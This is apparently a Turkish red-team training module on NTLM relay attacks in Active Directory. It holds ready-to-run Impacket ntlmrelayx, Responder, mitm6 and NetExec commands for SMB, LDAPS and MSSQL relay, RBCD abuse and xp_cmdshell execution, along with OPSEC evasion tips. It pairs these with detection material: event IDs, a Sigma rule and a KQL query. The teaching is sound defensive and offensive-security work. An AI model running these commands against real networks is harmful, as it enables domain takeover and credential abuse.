## 1. Kavramsal Temel — Neden Var?

NTLM kimlik doğrulaması bir **challenge-response** protokolüdür: istemci parolayı asla göndermez; sunucunun ürettiği rastgele "challenge" değerini kendi NT hash'iyle şifreleyip geri yollar. Bu tasarımın kör noktası şudur: **challenge-response akışı, karşı tarafın gerçekten konuşmak istediğin sunucu olduğunu doğrulamaz.** Araya giren bir saldırgan, kurbandan gelen kimlik doğrulama mesajlarını *değiştirmeden başka bir sunucuya aynen iletebilir (relay)* ve o sunucu, kurbanın kimliğiyle oturum açar.

**Analoji:** Gece kulübünün fedaisi (sunucu) "Şu kağıttaki sayıyı imzala" der (challenge). Sen imzalı kağıdı alıp *başka* bir kulübün kapısına koşar, aynen verirsin. İkinci fedai imzayı VIP müşterinin geçerli imzası sanıp seni içeri alır. İmzayı hiç kırmadın (parolayı çözmedin) — sadece **aracı** oldun.

**Relay ile kırma (crack) farkı:** Kerberoasting'de hash'i çevrimdışı *kırarsın* (parola gerekir). Relay'de **hiç parola kırmazsın** — kimlik doğrulamayı canlı yönlendirirsin. Bu yüzden 25+ karakterlik makine hesabı parolaları (`MACHINE$`) bile relay'e savunmasızdır: kimseyi kırmıyorsun.

**İki ön koşul:** (1) Kurbanı sana kimlik doğrulamaya **zorlamak** — poisoning ([Red 02.1](../Modul_02_Ilk_Erisim_ve_Yerlesme/02.1_LLMNR_NBTNS_mDNS_Poisoning.md)) veya [koersiyon](./08.2_PetitPotam_PrinterBug_DFSCoerce.md); (2) Hedef sunucuda **imzalama (signing) zorunlu olmaması** — imzalama, oturum ortasındaki değişimi kriptografik yakalar → [Blue 8.2](../../2-Blue_Team/Modul_08_Protokol_Sertlestirme_ve_Relay_Onleme/08.2_SMB_Signing_Zorlama.md).

## 2. Teknik Derinlik — NTLMSSP ve Relay Mekaniği

NTLM üç mesajlık el sıkışmadır (NTLMSSP). Relay saldırganı bu üç mesajı iki bağlantı arasında köprüler:

```
 KURBAN (client)          SALDIRGAN (ntlmrelayx)              HEDEF (relay: DC/SMB/LDAP)
     │  NEGOTIATE (Type1) →   │                                     │
     │                        │ ── NEGOTIATE (Type1) ────────────→  │
     │                        │ ←─ CHALLENGE (Type2, server nonce)  │  ← hedefin nonce'u
     │  ← CHALLENGE (Type2)   │   (hedefin nonce'u kurbana iletilir)│
     │  AUTHENTICATE (Type3)→ │   NetNTLMv2 = HMAC-MD5(NThash,nonce) │
     │                        │ ── AUTHENTICATE (Type3) ─────────→  │  ← geçerli oturum!
     │                        │                     [oturum açıldı]  │
```

**Kritik bayraklar — Type2/Type3 `NTLMSSP_NEGOTIATE_SIGN` / `NEGOTIATE_ALWAYS_SIGN` / MIC:** Hedef "imzalama/MIC zorunlu" derse relay çöker. `ntlmrelayx`, **CVE-2019-1040 (Drop the MIC)** ile MIC'i kaldırıp `--remove-mic` bayrak düşürme yaparak SMB→LDAP cross-protocol relay'i açar. MIC (Message Integrity Code), Type3 içinde tüm üç mesajın HMAC'idir; kaldırılırsa saldırgan bayrakları serbestçe değiştirir.

**Protokol matrisi — neyi nereye relay edebilirsin:**

| Kaynak → Hedef | İmzalama varsayılanı | Relay? | Kazanç |
|---|---|---|---|
| SMB → SMB | Üye sunucuda zorlanmaz | ✅ (signing kapalı) | Uzak komut / dosya |
| SMB → LDAP(S) | DC'de "negotiate" | ✅ (signing+CB kapalı) | RBCD / Shadow Cred yaz |
| HTTP → LDAP | LDAP imzası HTTP'yi bağlamaz | ✅ | ACL değişikliği |
| HTTP → AD CS Web Enroll | EPA yoksa | ✅ **ESC8** | Sertifika → [08.3](./08.3_Relay_AD_CS_ESC8_Zinciri.md) |

**Neden SMB→LDAP zordur:** LDAP oturum imzalama, SMB oturum anahtarına bağlıdır; `--remove-mic` olmadan LDAP imza bekler. Pratikte **HTTP kaynağı** (WebDAV/AuthIP koersiyonu → [08.2](./08.2_PetitPotam_PrinterBug_DFSCoerce.md)) LDAP'a relay için tercih edilir, çünkü HTTP oturumu imza taşımaz.

**Cross-protocol kilit noktası:** SMB Type3 içindeki `NTLMv2_RESPONSE`, hedefin sadece `nonce`'una bağlıdır — hangi protokol üzerinden gittiğine değil. Bu yüzden SMB'den yakalanan yanıt LDAP'a "yamalanır". EPA/Channel Binding (kanal + kimlik bağlama) tam olarak bunu kırar → [Blue 8.1](../../2-Blue_Team/Modul_08_Protokol_Sertlestirme_ve_Relay_Onleme/08.1_LDAP_Signing_ve_Channel_Binding.md).

**NetNTLMv2 yanıt yapısı (neden relay edilir, kırılmaz):**
```
 NTLMv2_RESPONSE = HMAC-MD5(NTLMv2_hash, server_challenge || blob)
   NTLMv2_hash = HMAC-MD5(NT_hash, UPPER(user) || domain)
   blob = { timestamp, client_challenge, target_info (AV_PAIRs) }
```
`target_info` içindeki `MsvAvChannelBindings` (AV_PAIR 0x000A) ve `MsvAvFlags` (MIC işareti) alanları, EPA/MIC savunmasının tutunduğu yerlerdir. Saldırgan bunları göremez/değiştiremez (HMAC ile mühürlü) — bu yüzden yanıtı **kırmak** yerine **aynen iletmek** (relay) tek yoldur. Kanal bağlama açıksa `MsvAvChannelBindings`, kurbanın konuştuğu TLS kanalının hash'ini taşır ve relay hedefinin kanalıyla uyuşmaz → red.

**Oturum yönetimi (SOCKS vs tek-atış):** `ntlmrelayx -socks`, başarılı NTLM oturumlarını canlı tutar ve bir SOCKS proxy'de sunar; saldırgan `proxychains` ile bu oturumları defalarca kullanır (kimlik doğrulama tekrarı gerekmez). Bu, tek bir koersiyon tetiğinden çok sayıda komut çalıştırmayı sağlar — ama oturum, kurban bağlantısı kapanınca ölür.

## 3. Pratik Uygulama — Çok Araçlı

**A) SMB relay + SOCKS (Impacket):**
```bash
# Signing KAPALI hostları hedefle, oturumları SOCKS'ta tut
impacket-ntlmrelayx -tf targets.txt -smb2support -socks
sudo responder -I eth0 -dwv     # LLMNR/NBT-NS zehirle (SMB imzalamayı Responder.conf'ta OFF bırak)
# SOCKS üzerinden komut:
proxychains impacket-smbexec -no-pass 'DOMAIN/victim@10.0.0.50'
```

**B) SMB → LDAPS relay ile RBCD yazma (makine hesabı ele geçirme):**
```bash
# Kurban makine hesabı DC LDAP'ına relay edilir; saldırgan kontrollü hesap RBCD'ye eklenir
impacket-ntlmrelayx -t ldaps://dc01.corp.local --delegate-access \
    --escalate-user ATTACKERPC\$ -smb2support
# Sonuç: victim makinesine msDS-AllowedToActOnBehalfOfOtherIdentity = ATTACKERPC$
# → S4U ile victim üzerinde SYSTEM (bkz Red 06.3 RBCD)
```

**C) Signing durumu tespiti (hedef seçimi):**
```bash
# NetExec ile domain genelinde imzalama KAPALI SMB hostları listele → targets.txt
nxc smb 10.0.0.0/24 --gen-relay-list targets.txt
# LDAP tarafı imzalama/CB durumu:
nxc ldap dc01.corp.local -u user -p pass -M ldap-checker
```

**D) mitm6 ile IPv6/DNS zehirleme (kaynak üretmenin en güvenilir yolu):**
```bash
# Windows IPv6'yı tercih eder; mitm6 sahte DHCPv6 + DNS ile WPAD/kimlik trafiğini yakalar
sudo mitm6 -d corp.local
impacket-ntlmrelayx -6 -t ldaps://dc01.corp.local -wh attacker-wpad --delegate-access
# -wh: WPAD host; kurban tarayıcı/servis proxy auth'u gönderir → LDAP'a relay
```

**E) MSSQL'e relay (veritabanı sunucusunda komut):**
```bash
impacket-ntlmrelayx -t mssql://sql01.corp.local -smb2support -q "EXEC xp_cmdshell 'whoami'"
```

**F) Örnek çıktı (başarılı relay):**
```
[*] Servers started, waiting for connections
[*] SMBD-Thread-4: Connection from CORP/SRV01$@10.0.0.30 controlled, relaying...
[*] Authenticating against ldaps://dc01 as CORP/SRV01$ SUCCEED
[*] Delegation rights modified successfully!
[*] ATTACKERPC$ can now impersonate users on SRV01$ via S4U2Proxy
```

**Gerçek-dünya zinciri:**
```
mitm6 (DNS spoof, IPv6) ──▶ WPAD/HTTP auth zorla ──▶ ntlmrelayx -t ldaps://dc
        │                                                    │
        └── kurban: kurumsal iş istasyonu (SRV01$)          ▼
                                              RBCD yaz ▶ S4U2Proxy ▶ SRV01 SYSTEM ▶ LSASS ▶ DA
```

## 4. Bıraktığı İz ve Karşı Tespit

| Teknik | MITRE ATT&CK | Kaynak İz (IOC) | Karşı Blue |
|---|---|---|---|
| NTLM Relay | **T1557.001** (LLMNR/NBT-NS Poison & Relay) | 4624 Type 3, `LogonProcessName=NtLmSsp`, kaynak IP ≠ hesap sahibi host | [Blue 8.3](../../2-Blue_Team/Modul_08_Protokol_Sertlestirme_ve_Relay_Onleme/08.3_NTLM_Kisitlama_ve_NTLMv2.md) |
| SMB→LDAP RBCD | **T1187 / T1098** | 5136 `msDS-AllowedToActOnBehalfOfOtherIdentity` değişimi | [Blue 8.1](../../2-Blue_Team/Modul_08_Protokol_Sertlestirme_ve_Relay_Onleme/08.1_LDAP_Signing_ve_Channel_Binding.md) |
| CVE-2019-1040 MIC drop | T1557 | Yamasız DC; Type3'te MIC yok | [Blue 8.4](../../2-Blue_Team/Modul_08_Protokol_Sertlestirme_ve_Relay_Onleme/08.4_Koersiyon_Onleme_PetitPotam_PrinterBug.md) |

**OPSEC notları:**
- **Anomali imzası:** Bir makine hesabının (`SRV01$`) DC'ye **başka bir IP'den** (saldırgan hostu) NTLM ile giriş yapması en net göstergedir — makine kendi IP'sinden konuşur. Blue tarafı 4624 içindeki `IpAddress` ↔ hesap eşleşmesini avlar.
- **Zamanlama:** Relay penceresi saniyeler sürer; toplu 5136 ACL değişiklikleri gürültü yaratır. Tek hedefe odaklan, `--escalate-user` sonrası oturumu bırak.
- **Signing zorlanmışsa** relay Type3'te `STATUS_ACCESS_DENIED`/imza hatası ile düşer — hedef seçimi kritiktir.
- **mitm6 gürültüsü:** Sahte DHCPv6 tüm segmente yayılır → ağda ani IPv6 adres dağıtımı ve WPAD DNS sorguları belirgin anomalidir. Hedefli kullan (`-hw`/`--host-allowlist` ile tek kurbanı hedefle), tüm segmenti zehirleme.
- **Kimlik doğrulama tekrarı yok:** Relay edilen oturum tek seferliktir; aynı kurbanı yeniden kullanmak için yeni koersiyon/poisoning gerekir. `-socks` bunu hafifletir ama oturum ömrü kısadır.

**Tespit mantığı (Blue bakışı):** Olgun bir SIEM şu korelasyonu kurar: *aynı hesap için kısa aralıkta iki farklı kaynak IP'den 4624 Type 3 (NtLmSsp)* → biri gerçek host, diğeri relay. Ayrıca makine hesaplarının (`$`) interaktif olmayan NTLM girişleri beyaz listeye alınıp sapmalar avlanır. Bu yüzden relay, **imzalama+EPA zorlanmış** ortamda hem teknik hem tespit açısından çöker.

## 5. Doğrulama / Lab

```bash
# Atomic Red Team T1557.001 — kontrollü poisoning+relay lab
# 1) İki VM: DC (signing OFF, yamasız) + üye sunucu
# 2) Saldırgan: responder + ntlmrelayx -t ldaps://dc --delegate-access
# 3) Üye sunucudan \\ATTACKER\share erişimi tetikle → RBCD yazımını gözle
# Doğrulama sorgusu (Blue perspektifi):
Get-WinEvent -FilterHashtable @{LogName='Security';Id=4624} |
  Where-Object { $_.Properties[8].Value -eq 3 -and $_.Message -match 'NtLmSsp' }
```

**Sigma kuralı (relay göstergesi — makine hesabı, yabancı IP):**
```yaml
title: Potential NTLM Relay - Machine Account Logon from Unexpected IP
logsource: { product: windows, service: security }
detection:
  selection:
    EventID: 4624
    LogonType: 3
    AuthenticationPackageName: 'NTLM'
    TargetUserName|endswith: '$'          # makine hesabı
  filter_ownhost:
    IpAddress: '%TargetHostIP%'           # hesabın kendi IP'si (baseline)
  condition: selection and not filter_ownhost
level: high
```

**KQL (Microsoft Sentinel / Defender — relay + RBCD korelasyonu):**
```kusto
SecurityEvent
| where EventID == 4624 and LogonType == 3 and AuthenticationPackageName == "NTLM"
| where TargetUserName endswith "$"
| join kind=inner (
    SecurityEvent | where EventID == 5136
    | where AttributeLDAPDisplayName == "msDS-AllowedToActOnBehalfOfOtherIdentity")
  on $left.Computer == $right.Computer
| project TimeGenerated, TargetUserName, IpAddress, AttributeValue
```
Bu iki olayın (yabancı IP'den makine hesabı NTLM girişi + RBCD yazımı) dakikalar içinde eşleşmesi, relay→delegation zincirinin kesin imzasıdır.
